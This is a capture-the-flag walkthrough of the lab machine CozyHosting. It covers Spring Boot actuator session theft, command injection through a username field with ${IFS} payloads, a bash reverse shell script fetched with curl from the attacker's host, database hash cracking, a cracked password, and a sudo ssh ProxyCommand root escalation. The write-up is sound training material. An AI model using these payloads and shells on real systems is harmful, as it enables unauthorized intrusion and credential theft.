---
icon: ubuntu
---

# CozyHosting - Easy

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```bash
# Nmap TCP
nmap -A -T4 -p- -Pn 10.10.11.230 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-22 15:54 EDT
Nmap scan report for cozyhosting.htb (10.10.11.230)
Host is up (0.046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Cozy Hosting - Home
|_http-server-header: nginx/1.18.0 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   85.19 ms 10.10.16.1
2   24.91 ms cozyhosting.htb (10.10.11.230)
```

The HTTP server on 80 is redirecting to `cozyhosting.htb` I'll add it to my `/etc/hosts` file&#x20;

```bash
10.10.11.230	cozyhosting.htb
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2774).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2775).png" alt=""><figcaption></figcaption></figure>

Default credentials do not seem to do the trick and we also see a Cookie being created when trying to login. `JSESSIONSID` might be a Java web framework

<figure><img src="../../.gitbook/assets/image (2777).png" alt=""><figcaption></figcaption></figure>

The login page also reveals Bootstrap. This makes me think of the Springboot framework

<figure><img src="../../.gitbook/assets/image (2778).png" alt=""><figcaption></figcaption></figure>

Visiting a non existent page reveals a 404 page that matches the default erro page for Java Spring Boot

Now that I know this I will do directory busting accordingly! and use a wordlist for Springboot

#### Directory Busting

{% code overflow="wrap" %}
```bash
feroxbuster -u http://cozyhosting.htb -w ~/tools/SecLists/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2783).png" alt=""><figcaption></figcaption></figure>

Found `/actuator` path!

#### <mark style="color:yellow;">Actuators</mark>

<mark style="background-color:$primary;">Spring Boot includes a set of features that are designed for monitoring, managing, and debugging applications known as actuators.</mark> <mark style="background-color:$primary;"></mark><mark style="background-color:$primary;">`/actuator/mapping`</mark> <mark style="background-color:$primary;"></mark><mark style="background-color:$primary;">gives a detailed list about the application, including not only the actuators, but also other endpoints for the application</mark>

### <mark style="color:$primary;">Querying Actuator Path</mark>

```bash
curl -s http://cozyhosting.htb/actuator/mappings | jq .
```

<figure><img src="../../.gitbook/assets/image (2780).png" alt=""><figcaption></figcaption></figure>

This will reveal a ton of information! To get a "better" list use the following command:

{% code overflow="wrap" %}
```bash
curl -s http://cozyhosting.htb/actuator/mappings | jq -c '.contexts.application.mappings.dispatcherServlets.dispatcherServlet | .[] | [.handler, .predicate]'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2782).png" alt=""><figcaption></figcaption></figure>

There is a `/actuator/sessions` endpoint let's querry it

```bash
curl -s http://cozyhosting.htb/actuator/sessions | jq .
```

<figure><img src="../../.gitbook/assets/image (2784).png" alt=""><figcaption></figcaption></figure>

Found a `JSESSIONSID` for kenderson let's use it to steal kanderson's session and gain access

### <mark style="color:$primary;">Session Stealing</mark>

go into Chrome Application, under Storage -> Cookies and replace the value for `JSESSIONID` with the kandersons user’s cookie.

<figure><img src="../../.gitbook/assets/image (2785).png" alt=""><figcaption></figcaption></figure>

Now refresh the `/login` page and you will be redirected to the admin page authenticated as K.Anderson

<figure><img src="../../.gitbook/assets/image (2786).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">OS Command Injection</mark>

When I tested to see if the connection would try to reach out to my machine I found a error message

<figure><img src="../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

Checking the request in Burp Suite we find something interesting

<figure><img src="../../.gitbook/assets/image (2752).png" alt=""><figcaption></figcaption></figure>

it makes a request to `executessh` and it is passing the variables needed to execute a command on the terminal. This seems like a possibility for command injection! It's probably running a command like `ssh -i key username@hostname`  to connect

<figure><img src="../../.gitbook/assets/image (2753).png" alt=""><figcaption></figcaption></figure>

```
deimos;curl${IFS}10.10.16.7/test.sh
```

<figure><img src="../../.gitbook/assets/image (2754).png" alt=""><figcaption></figcaption></figure>

There is command injection on the user Variable! I am going to see if I can get an easy shell with nc if not I will create a reverse bashscript and place it in the /tmp folder and run it!

nc shell did not gave me a stable shell moving on to createing a malicious bash script. Saved it as reverse.sh

{% code title="reverse.sh" %}
```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.7/80 0>&1
```
{% endcode %}

{% code title="username command" overflow="wrap" %}
```bash
deimos;curl${IFS}http://10.10.16.7/reverse.sh${IFS}-o${IFS}/tmp/reverse.sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2755).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2756).png" alt=""><figcaption></figcaption></figure>

Now make sure you have a listener ready and run the following command

{% code title="username command" %}
```bash
deimos;bash${IFS}/tmp/reverse.sh
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2757).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2758).png" alt=""><figcaption></figcaption></figure>

and we got a shell as app

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2759).png" alt=""><figcaption></figcaption></figure>

We see a potential username that might have credentials lurking on the machine namely `josh`. Let's do some manual enumeration

### <mark style="color:$primary;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (2761).png" alt=""><figcaption></figcaption></figure>

In app's directory we see the java application running as app. Furthermore it seems to be running on localhost port 8080!

<figure><img src="../../.gitbook/assets/image (2762).png" alt=""><figcaption></figcaption></figure>

nginx is forwarding traffic for `cozyhosting.htb` to port 8080

### <mark style="color:$primary;">Enumerating Jar file</mark>

I am going to make a copy of the jar file in `/dev/shm` and unzip it to take a look

<figure><img src="../../.gitbook/assets/image (2763).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2764).png" alt=""><figcaption></figcaption></figure>

First interesting that catches my eyes is the postgresql file. I'll Keep the Database in mind. Second thing in a jar File to check is the `MANIFEST.MF` file&#x20;

Nothing interesting came up yet, I'll use grep to search for passwords&#x20;

```bash
grep -r password . 2>/dev/null
```

<figure><img src="../../.gitbook/assets/image (2765).png" alt=""><figcaption></figcaption></figure>

The first line reveals a password let's take a better look at the file

<figure><img src="../../.gitbook/assets/image (2766).png" alt=""><figcaption></figcaption></figure>

These are credentials for the postgresql Database. Let's take a lookt at the DB

### <mark style="color:$primary;">Enumerating PostgreSQL</mark>

```bash
psql -h localhost -U postgres
```

<figure><img src="../../.gitbook/assets/image (2767).png" alt=""><figcaption></figcaption></figure>

let's take a look at the cozyhosting DB

<figure><img src="../../.gitbook/assets/image (2768).png" alt=""><figcaption></figcaption></figure>

We managed to find 2 hashes in the users table. I'll save them to a file and try to crack them

### <mark style="color:$primary;">Cracking hashes</mark>

```bash
john hashes -w=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (2769).png" alt=""><figcaption></figcaption></figure>

We managed to crack the admin user's has. Let's see if there is credential reuse and test this password for john

```
john:manchesterunited
```

<figure><img src="../../.gitbook/assets/image (2770).png" alt=""><figcaption></figcaption></figure>

We were able to ssh into the machine!

### <mark style="color:$primary;">SUDO SSH -> root</mark>

<figure><img src="../../.gitbook/assets/image (2771).png" alt=""><figcaption></figcaption></figure>

john is able to run ssh with elevated privileges. There is an easy privesc solution available on [**GTFObins**](https://gtfobins.github.io/gtfobins/ssh/#sudo)

<figure><img src="../../.gitbook/assets/image (2772).png" alt=""><figcaption></figcaption></figure>

run the following command and you shall be root!

```bash
sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x
```

<figure><img src="../../.gitbook/assets/image (2773).png" alt=""><figcaption></figcaption></figure>
